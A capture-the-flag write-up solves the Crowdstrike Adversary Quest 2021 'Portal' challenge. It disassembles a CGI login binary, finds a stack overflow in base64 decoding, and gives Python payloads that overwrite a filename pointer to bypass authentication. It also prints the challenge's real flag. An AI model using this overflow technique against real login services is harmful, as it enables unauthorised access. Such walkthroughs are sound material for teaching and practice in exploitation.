# Crowdstrike Adversary Quest 2021 / Protective Penguin / #1 Portal

## Challenge Description
PROTECTIVE PENGUIN gained access to one of their victims through the victim's extranet authentication portals and we were asked to investigate.
Please download the Portal Code and see whether you can reproduce their means of initial access vector. We stood up a test instance of the authentication portal for you to validate against.
NOTE: Flags will be easily identifiable by following the format CS{some_secret_flag_text}. They must be submitted in full, including the CS{ and } parts.

## Authentication Portal, Local Files
The archive for the test instance contains the following files:
```
./index.html
./run.sh
./cgi-bin
./cgi-bin/portal.cgi
./creds.txt
```

For testing purposes, use run.sh to fire up a local webserver through python...
```
#!/bin/sh
export FLAG=CS{foobar}
python3 -m http.server --cgi --bind 127.0.0.1
```
```
./run.sh 
Serving HTTP on 127.0.0.1 port 8000 (http://127.0.0.1:8000/) ...
```
... serving a rather simple web page resembling a VPN login.
![VPN login page](pics/1.png)

### Page Source
The login form uses an inline Javascript function *auth()* on submitting data for the fields *input_username* and *input_password*...
```javascript
function auth() {
  let creds = {
    user: btoa(document.getElementById("input_username").value),
    pass: btoa(document.getElementById("input_password").value)
  };
  if (!creds.user) {
    notification("Empty username", "warning");
    return;
  }
  if (!creds.pass) {
    notification("Empty password", "warning");
    return;
  }

  fetch("/cgi-bin/portal.cgi", {
    method: "POST",
    body: JSON.stringify(creds),
  }).then(function (response) {
    return response.text();
  }).then(function (data) {
    let json = JSON.parse(data);
    if (json.status == "success") {
      notification(`Login success: ${json.flag}`, "success");
[...]
```
... which base64 encodes both field values and delivers them via HTTP POST as JSON to the CGI program */cgi-bin/portal.cgi*.
A test run with admin/admin creds looks like this:
```json
{"user":"YWRtaW4=","pass":"YWRtaW4="}
```

The web page and the Javascript do not seem to be vulnerable, so the attention is on to portal.cgi!

### Portal CGI, Checksec
A little glance at program security features with checksec never hurts...
```
/usr/bin/checksec --file=cgi-bin/portal.cgi
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols        No    0               3               cgi-bin/portal.cgi
```
... and shows usage of stack canaries but also no PIE (position independent executable). So the base code might not make use of ASLR (address space layout randomization), which could be a first wink.

### Portal CGI, Binary info
Gathering some ELF infos with readelf yields program entry point **0x401140** (no ASLR).
```
readelf -a cgi-bin/portal.cgi 
ELF Header:
  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 
  Class:                             ELF64
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           Advanced Micro Devices X86-64
  Version:                           0x1
  Entry point address:               0x401140
```
Quickly identify entrypoint of function *main* via rabin2
```
rabin2 -M cgi-bin/portal.cgi 
[Main]
vaddr=0x00401434 paddr=0x00401434
```

### Portal CGI, Disassemble main() @ 0x401434
Use radare2 to disassemble function *main* of portal.cgi (output is shortened for readability and additionally commented with ;;)
```assembly
r2 -q -c "pd 125 @ main" cgi-bin/portal.cgi 
            ;-- main:
            0x00401434      55             push rbp
            0x00401435      4889e5         mov rbp, rsp
            0x00401438      4881ec600400.  sub rsp, 0x460
[...]
            0x004014a5      488d3d6c0b00.  lea rdi, str.Content_Type:_application_json_r_n_r ; 0x402018 ; "Content-Type: application/json\r\n\r"
            0x004014ac      e88ffbffff     call sym.imp.puts
            0x004014b1      488d3d820b00.  lea rdi, str.REQUEST_METHOD ; 0x40203a ; "REQUEST_METHOD"
            0x004014b8      e873fbffff     call sym.imp.getenv
            0x004014bd      488d35850b00.  lea rsi, str.POST           ; 0x402049 ; "POST"
            0x004014c4      4889c7         mov rdi, rax
            0x004014c7      e804fcffff     call sym.imp.strcmp
            0x004014cc      85c0           test eax, eax
        ┌─< 0x004014ce      741b           je 0x4014eb  ;; REQUEST_METHOD == "POST"
[...]
       │└─> 0x004014eb      488d3d7e0b00.  lea rdi, str.CONTENT_LENGTH ; 0x402070 ; "CONTENT_LENGTH"
       │    0x004014f2      e839fbffff     call sym.imp.getenv
       │    0x004014f7      4889c7         mov rdi, rax
       │    0x004014fa      e821fcffff     call sym.imp.atoi
       │    0x004014ff      8985c4fbffff   mov dword [rbp - 0x43c], eax
       │    0x00401505      83bdc4fbffff.  cmp dword [rbp - 0x43c], 0
       │┌─< 0x0040150c      780d           js 0x40151b
       ││   0x0040150e      8b85c4fbffff   mov eax, dword [rbp - 0x43c]
       ││   0x00401514      3dff030000     cmp eax, 0x3ff              ; 1023
      ┌───< 0x00401519      761b           jbe 0x401536  ;; CONTENT_LENGTH <= 1023
[...]
      └───> 0x00401536      488b0d732b00.  mov rcx, qword [obj.stdin]  ; [0x4040b0:8]=0
       │    0x0040153d      8b85c4fbffff   mov eax, dword [rbp - 0x43c]
       │    0x00401543      4863d0         movsxd rdx, eax
       │    0x00401546      488d85f0fbff.  lea rax, [rbp - 0x410]
       │    0x0040154d      be01000000     mov esi, 1
       │    0x00401552      4889c7         mov rdi, rax
       │    0x00401555      e8f6faffff     call sym.imp.fread  ;; fread body into [rbp - 0x410]
[...]
       │    0x00401572      488d85f0fbff.  lea rax, [rbp - 0x410]
       │    0x00401579      4889c7         mov rdi, rax
       │    0x0040157c      e85ffbffff     call sym.imp.json_tokener_parse  ;; parse body JSON
[...]
       │    0x004015ac      488d95c8fbff.  lea rdx, [rbp - 0x438]
       │    0x004015b3      488b85e8fbff.  mov rax, qword [rbp - 0x418]
       │    0x004015ba      488d35e40a00.  lea rsi, str.user           ; 0x4020a5 ; "user"
       │    0x004015c1      4889c7         mov rdi, rax
       │    0x004015c4      e867fbffff     call sym.imp.json_object_object_get_ex  ;; put json obj pointer for user into [rbp - 0x438]
       │    0x004015c9      85c0           test eax, eax
       │    0x004015cb      0f84b7000000   je 0x401688
       │    0x004015d1      488d95d0fbff.  lea rdx, [rbp - 0x430]
       │    0x004015d8      488b85e8fbff.  mov rax, qword [rbp - 0x418]
       │    0x004015df      488d35c40a00.  lea rsi, str.pass           ; 0x4020aa ; "pass"
       │    0x004015e6      4889c7         mov rdi, rax
       │    0x004015e9      e842fbffff     call sym.imp.json_object_object_get_ex  ;; put json obj pointer for pass into [rbp - 0x430]
       │    0x004015ee      85c0           test eax, eax
       │    0x004015f0      0f8492000000   je 0x401688
       │    0x004015f6      488b85c8fbff.  mov rax, qword [rbp - 0x438]
       │    0x004015fd      4889c7         mov rdi, rax
       │    0x00401600      e8abfaffff     call sym.imp.json_object_get_string  ;; get pointer to value for user
       │    0x00401605      488985d8fbff.  mov qword [rbp - 0x428], rax  ;; save to [rbp - 0x428]
       │    0x0040160c      4883bdd8fbff.  cmp qword [rbp - 0x428], 0
       │    0x00401614      7472           je 0x401688
       │    0x00401616      488b85d0fbff.  mov rax, qword [rbp - 0x430]
       │    0x0040161d      4889c7         mov rdi, rax
       │    0x00401620      e88bfaffff     call sym.imp.json_object_get_string  ;; get pointer to value for pass
       │    0x00401625      488985e0fbff.  mov qword [rbp - 0x420], rax  ;; save to [rbp - 0x420]
       │    0x0040162c      4883bde0fbff.  cmp qword [rbp - 0x420], 0
       │    0x00401634      7452           je 0x401688
       │    0x00401636      488b95e0fbff.  mov rdx, qword [rbp - 0x420]
       │    0x0040163d      488b85d8fbff.  mov rax, qword [rbp - 0x428]
       │    0x00401644      4889d6         mov rsi, rdx
       │    0x00401647      4889c7         mov rdi, rax
       │    0x0040164a      e8d7fbffff     call 0x401226  ;; call validate(char *lpsz_user_b64, char *lpsz_pass_b64)
       │    0x0040164f      85c0           test eax, eax
       │    0x00401651      7522           jne 0x401675  ;; print flag value if validate returned 0 (winning condition)
       │    0x00401653      488d3d550a00.  lea rdi, str.FLAG           ; 0x4020af ; "FLAG"
       │    0x0040165a      e8d1f9ffff     call sym.imp.getenv
       │    0x0040165f      4889c6         mov rsi, rax
       │    0x00401662      488d3d4f0a00.  lea rdi, str._status_:__success____flag_:___s_ ; 0x4020b8 ; "{\"status\": \"success\", \"flag\": \"%s\"}"
       │    0x00401669      b800000000     mov eax, 0
       │    0x0040166e      e82dfaffff     call sym.imp.printf
[...]
```
### Analysis Summary for main()
- env REQUEST_METHOD has to be **POST**
- env CONTENT_LENGTH has to be less than 1024
- Parses HTTP POST BODY as JSON, find string pointers for *user* and *pass*
- Calls a supposed validate function @ 0x401226 with parsed JSON values for *user* and *pass* as arguments
- If validate function returns 0, the flag is returned from the portal.cgi

### Portal CGI, Disassemble validate() @ 0x401226
Use radare2 to disassemble function *main* of portal.cgi (output is shortened for readability and additionally commented with ;;)
```assembly
r2 -q -c "pd 107 @ 0x401226" cgi-bin/portal.cgi 
            0x00401226      55             push rbp
            0x00401227      4889e5         mov rbp, rsp
            0x0040122a      4881ec400200.  sub rsp, 0x240
            0x00401231      4889bdc8fdff.  mov qword [rbp - 0x238], rdi
            0x00401238      4889b5c0fdff.  mov qword [rbp - 0x240], rsi
            0x0040123f      64488b042528.  mov rax, qword fs:[0x28]
            0x00401248      488945f8       mov qword [rbp - 8], rax  ;; stack canary
[...]
            0x00401265      c785e0fdffff.  mov dword [rbp - 0x220], 1
            0x0040126f      488d05920d00.  lea rax, str.creds.txt      ; 0x402008 ; "creds.txt"
            0x00401276      488945e8       mov qword [rbp - 0x18], rax  ; save pointer to filename str "creds.txt" on stack @ [rbp - 0x18]
            0x0040127a      488d85e0fdff.  lea rax, [rbp - 0x220]
            0x00401281      488d88040100.  lea rcx, [rax + 0x104]
            0x00401288      488b85c8fdff.  mov rax, qword [rbp - 0x238]  ;; user_b64
            0x0040128f      ba00010000     mov edx, 0x100              ; dst size = 256
            0x00401294      4889ce         mov rsi, rcx  ;; dst = stack @ [rbp - 0x11c]
            0x00401297      4889c7         mov rdi, rax  ;; src = user_b64
            0x0040129a      e861feffff     call sym.imp.__b64_pton  ;; base64_decode(user_b64, dst, dst_size)
            0x0040129f      488d85e0fdff.  lea rax, [rbp - 0x220]
            0x004012a6      480504010000   add rax, 0x104              ; 260
            0x004012ac      4889c7         mov rdi, rax
            0x004012af      e8bcfdffff     call sym.imp.strlen  ;; strlen(base64_decoded_user)
            0x004012b4      4889c2         mov rdx, rax
            0x004012b7      488d85e0fdff.  lea rax, [rbp - 0x220]
            0x004012be      480504010000   add rax, 0x104              ; 260
            0x004012c4      4801d0         add rax, rdx
            0x004012c7      66c7003a00     mov word [rax], 0x3a        ;; add ':' after base64_decoded_user
                                                                       ; [0x3a:2]=0xffff ; 58                                                                                                                
            0x004012cc      488d85e0fdff.  lea rax, [rbp - 0x220]
            0x004012d3      480504010000   add rax, 0x104              ; 260
            0x004012d9      4889c7         mov rdi, rax
            0x004012dc      e88ffdffff     call sym.imp.strlen  ;; strlen(base64_decoded_user + ':')
            0x004012e1      4889c2         mov rdx, rax
            0x004012e4      488d85e0fdff.  lea rax, [rbp - 0x220]
            0x004012eb      480504010000   add rax, 0x104              ; 260
            0x004012f1      488d0c10       lea rcx, [rax + rdx]
            0x004012f5      488b85c0fdff.  mov rax, qword [rbp - 0x240]  ;; pass_b64
            0x004012fc      ba00010000     mov edx, 0x100              ; dst size = 256
            0x00401301      4889ce         mov rsi, rcx  ;; dst = stack @ [rbp - 0x11c + strlen(base64_decoded_user + ':')]
            0x00401304      4889c7         mov rdi, rax  ;; src = pass_b64
            0x00401307      e8f4fdffff     call sym.imp.__b64_pton  ;; base64_decode(pass_b64, dst, dst_size)
            0x0040130c      488b45e8       mov rax, qword [rbp - 0x18]  ;; [rbp - 0x18] is used as lpsz_filename for fopen @ 0x0040131a
            0x00401310      488d35fb0c00.  lea rsi, [0x00402012]       ; "r"
            0x00401317      4889c7         mov rdi, rax
            0x0040131a      e8f1fdffff     call sym.imp.fopen  ;; fopen([rbp - 0x18], "r")
            0x0040131f      488985d0fdff.  mov qword [rbp - 0x230], rax
            0x00401326      4883bdd0fdff.  cmp qword [rbp - 0x230], 0
            0x0040132e      0f85aa000000   jne 0x4013de  ;; read next line from file
[...]
            0x0040133e      488d85e0fdff.  lea rax, [rbp - 0x220]
            0x00401345      4883c004       add rax, 4
            0x00401349      4889c7         mov rdi, rax
            0x0040134c      e81ffdffff     call sym.imp.strlen  ;; strlen([rbp - 0x21c])
            0x00401351      488985d8fdff.  mov qword [rbp - 0x228], rax
            0x00401358      488d85e0fdff.  lea rax, [rbp - 0x220]
            0x0040135f      4883c004       add rax, 4
            0x00401363      be3a000000     mov esi, 0x3a               ; ':' ; 58
            0x00401368      4889c7         mov rdi, rax
            0x0040136b      e820fdffff     call sym.imp.strchr  ;; strchr([rbp - 0x21c], ":")
            0x00401370      4885c0         test rax, rax
            0x00401373      7502           jne 0x401377  ;; found colon
            0x00401375      eb67           jmp 0x4013de  ;; read next line from file
            0x00401377      4883bdd8fdff.  cmp qword [rbp - 0x228], 0  ;; is line empty?
            0x0040137f      742a           je 0x4013ab
            0x00401381      488b85d8fdff.  mov rax, qword [rbp - 0x228]
            0x00401388      4883e801       sub rax, 1
            0x0040138c      0fb68405e4fd.  movzx eax, byte [rbp + rax - 0x21c]
            0x00401394      3c0a           cmp al, 0xa                 ;; is line ending with newline?
            0x00401396      7513           jne 0x4013ab
            0x00401398      488b85d8fdff.  mov rax, qword [rbp - 0x228]
            0x0040139f      4883e801       sub rax, 1
            0x004013a3      c68405e4fdff.  mov byte [rbp + rax - 0x21c], 0  ;; null terminate line
            0x004013ab      488d85e0fdff.  lea rax, [rbp - 0x220]
            0x004013b2      488d5004       lea rdx, [rax + 4]
            0x004013b6      488d85e0fdff.  lea rax, [rbp - 0x220]
            0x004013bd      480504010000   add rax, 0x104              ; 260
            0x004013c3      4889d6         mov rsi, rdx
            0x004013c6      4889c7         mov rdi, rax
            0x004013c9      e802fdffff     call sym.imp.strcmp  ;; strcmp(base64_decoded_user + ':' + base64_decoded_pass, line)
            0x004013ce      85c0           test eax, eax
            0x004013d0      750c           jne 0x4013de  ;; lines did not match, read next line from file
            0x004013d2      c785e0fdffff.  mov dword [rbp - 0x220], 0  ;; lines matched, success
            0x004013dc      eb2b           jmp 0x401409  ;; jump out
            0x004013de      488b85d0fdff.  mov rax, qword [rbp - 0x230]
[...]
            0x004013fb      e8c0fcffff     call sym.imp.fgets  ;; read up to 256 bytes from file to stack @ [rbp - 0x21c]
            0x00401400      4885c0         test rax, rax
            0x00401403      0f8535ffffff   jne 0x40133e  ;; read a line, do checks
            0x00401409      488b85d0fdff.  mov rax, qword [rbp - 0x230]
            0x00401410      4889c7         mov rdi, rax
            0x00401413      e848fcffff     call sym.imp.fclose
            0x00401418      8b85e0fdffff   mov eax, dword [rbp - 0x220]
            0x0040141e      488b75f8       mov rsi, qword [rbp - 8]
            0x00401422      64482b342528.  sub rsi, qword fs:[0x28]
            0x0040142b      7405           je 0x401432
            0x0040142d      e84efcffff     call sym.imp.__stack_chk_fail
            0x00401432      c9             leave
            0x00401433      c3             ret
```

### Analysis Summary for validate()
- fopen() of the *creds* file happens at 0x0040131a, using string pointer saved in local variable [rbp - 0x18] just **after** base64 decoding of user and pass
- Lines are read from the opened file that are either empty, newline terminated and < 256 bytes long or 256 bytes long
- The currently read line is checked for an occurrence of a colon (":"); if not read next line
- If this line is equal to base64_decoded_user + ":" + base64_decoded_pass, we got a match -> exit with value 0 (success) -> main will print FLAG (win!)

### Stack Layout of validate()
- [rbp - 0x220]: Local var that is checked for value 0 as winning condition
- [rbp - 0x21c]: Current line from creds file, up to 256 bytes / [rbp - 0x11d]
- [rbp - 0x11c]: Base64 decoded username, up to 256 bytes / [rbp - 0x1d]
- [rbp - 0x11c + strlen(base64 decoded username) + 1]: Base64 decoded password, up to 256 bytes
- [rbp - 0x18]: String pointer to filename to open for creds
- [rbp - 0x8]: Stack canary

### Attack Path Analysis
- Base64 decoded username and password can be up to 513 bytes long, exceeding the stack distance to next local var (0x11c - 0x18 = 260 bytes)
- Stack canary (and return pointer) could be overwritten, but the value of the canary is unknown, thus cheap stack smashing will be detected
- So the only local variable that could sensibly be overwritten is the filename string pointer
- For a reliable attack, there needs to be a string to a valid filename inside the non-ASLR region

```
rabin2 -zz cgi-bin/portal.cgi 
[Strings]
nth paddr      vaddr      len size section   type    string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000034 0x00000034 5   12             utf16le @8\v@\e
1   0x000002a8 0x004002a8 27  28   .interp   ascii   /lib64/ld-linux-x86-64.so.2
[...]
```

Bingo! There's exactly one static valid filename string pointer other than **creds.txt** and that is **/lib64/ld-linux-x86-64.so.2** at non-ASLR address **0x004002a8**.

## Constructing the Exploit
1) Find a colon seperated user:pass in /lib64/ld-linux-x86-64.so.2
2) Data can be binary, as user and pass are transmitted in base64 encoding
3) Pass should be expanded, e.g. with null bytes, so that strlen(user + ":" + pass) == 260 bytes
4) Add 0x004002a8 in little endian to pass
5) Base64 encode user and pass and fire them directly at the portal.cgi 

### Attempt 1 - The Fail...
Most writeups are polished without documenting failures. But here's one of mine.
While feeling somewhat clever, i thought:
- Why not debug the CGI
- Set breakpoint at function validate()
- Manually patch the filename to be opened to /lib64/ld-linux-x86-64.so.2
- Let CGI fgets the first line
- Dump that and use it for the exploit

Find PID of local python webserver
```
ps auxwwg | grep server
kali      486858  0.0  1.1  98440 17352 pts/0    S+   19:31   0:02 python3 -m http.server --cgi --bind 127.0.0.1
```

Attach with debugger of your choice
```
gdb -p 486858
```

Follow child process on fork and set breakpoints
```gdb
set follow-fork-mode child
set detach-on-fork off
break *0x401226  # validate()
break *0x40131A  # fopen()
break *0x4013c9  # strcmp()
continue
```

Send login data to portal.cgi with interactive python
```python
>>> import requests
>>> from base64 import b64encode
>>> import json
>>> data = {}
>>> data['user'] = b64encode(b"admin").decode('utf-8')
>>> data['pass'] = b64encode(b"admin").decode('utf-8')
>>> requests.post('http://127.0.0.1:8000/cgi-bin/portal.cgi', data=json.dumps(data)).text
```

Debugging
```gdb
Thread 2.1 "portal.cgi" hit Breakpoint 1, 0x0000000000401226 in ?? () <- start of validate()
gef➤  continue
Continuing.

Thread 2.1 "portal.cgi" hit Breakpoint 2, 0x000000000040131a in ?? () <- fopen()

fopen@plt (
   $rdi = 0x0000000000402008 → "creds.txt",
   $rsi = 0x0000000000402012 → 0x6f43000000000072 ("r"?)
)
```
Manually patch filename string pointer from 0x402008 to 0x4002a8
```gdb
gef➤  set $rdi=0x004002a8
gef➤  context
fopen@plt (
   $rdi = 0x00000000004002a8 → "/lib64/ld-linux-x86-64.so.2",
   $rsi = 0x0000000000402012 → 0x6f43000000000072 ("r"?)
)
gef➤  continue 
Continuing.

Thread 2.1 "portal.cgi" hit Breakpoint 3, 0x00000000004013c9 in ?? () <- strcmp()

strcmp@plt (
   $rdi = 0x00007ffc87839384 → "admin:admin",
   $rsi = 0x00007ffc87839284 → 0x013cb60f41f82948,
   $rdx = 0x00007ffc87839284 → 0x013cb60f41f82948,
   $rcx = 0x0000000000000004
)

gef➤  x/29x $rsi
0x7ffc87839284: 0x48    0x29    0xf8    0x41    0x0f    0xb6    0x3c    0x01
0x7ffc8783928c: 0x48    0x89    0xc8    0x48    0x89    0xd1    0x41    0x88
0x7ffc87839294: 0x3a    0x48    0x83    0xf8    0x09    0x77    0xd1    0x4c
0x7ffc8783929c: 0x89    0xd8    0xba    0x19    0x00
```

Okay. This is the null terminated (binary) data containing a colon (0x3a @ 0x7ffc87839294). Let's use the bytes up to colon as username, base64 encode that. Use bytes following colon up to null termination as password, base64 encode that. Fill up password with null bytes so that username + colon + password are 260 bytes long and then add the little endian address to overwrite the filename string pointer with the one for /lib64/ld-linux-x86-64.so.2!

Back to python console
```python
>>> username = b'\x48\x29\xf8\x41\x0f\xb6\x3c\x01\x48\x89\xc8\x48\x89\xd1\x41\x88'
>>> password = b'\x48\x83\xf8\x09\x77\xd1\x4c\x89\xd8\xba\x19'
>>> data['user'] = b64encode(username).decode('utf-8')
>>> data['pass'] = b64encode(password + b'\x00' * (260 - (len(username) + 1 + len(password))) + b'\xa8\x02\x40\x00').decode('utf-8')
>>> requests.post('http://127.0.0.1:8000/cgi-bin/portal.cgi', data=json.dumps(data)).text
'{"status": "success", "flag": "CS{foobar}"}'
```
That worked like a charm on the local vulnerable webserver. Awesomeness. The flag is so near. No?
```
>>> requests.post('https://authportal.challenges.adversary.zone:8880/cgi-bin/portal.cgi', data=json.dumps(data)).text
'{"status": "err"}'
```
This is a good time to step back, take a break. Do some physical workout and backtrack... ;-)

### Attempt 2 - Flag Time!
The exploit worked locally but failed remote. So what could be different? 
```
ls -l /lib64/ld-linux-x86-64.so.2
lrwxrwxrwx 1 root root 32 Jan  5 06:47 /lib64/ld-linux-x86-64.so.2 -> /lib/x86_64-linux-gnu/ld-2.31.so
```

Oh. It's a symlink to a file, that might be in a different version on the remote host. And the exploit was trying to match binary data, early in the file, which most likely has been code. Code that changes between versions...

So it's grep time for more colons, which hopefully are less version dependent.
```
xxd /lib64/ld-linux-x86-64.so.2
[...]
00022460: 6b00 0a70 7265 6c69 6e6b 2063 6865 636b  k..prelink check
00022470: 696e 673a 2025 730a 0066 6169 6c65 6400  ing: %s..failed.
```

There are a lot more colon seperated strings, but this one looked nice enough. So back to python console.
```python
>>> username = b'prelink checking'
>>> password = b' %s'
>>> data['user'] = b64encode(username).decode('utf-8')
>>> data['pass'] = b64encode(password + b'\x00' * (260 - (len(username) + 1 + len(password))) + b'\xa8\x02\x40\x00').decode('utf-8')
>>> requests.post('http://127.0.0.1:8000/cgi-bin/portal.cgi', data=json.dumps(data)).text
'{"status": "success", "flag": "CS{foobar}"}'
>>> requests.post('https://authportal.challenges.adversary.zone:8880/cgi-bin/portal.cgi', data=json.dumps(data)).text
'{"status": "success", "flag": "CS{w3b_vPn_h4xx}"}'
```


Flag: **CS{w3b_vPn_h4xx}**

## Conclusion

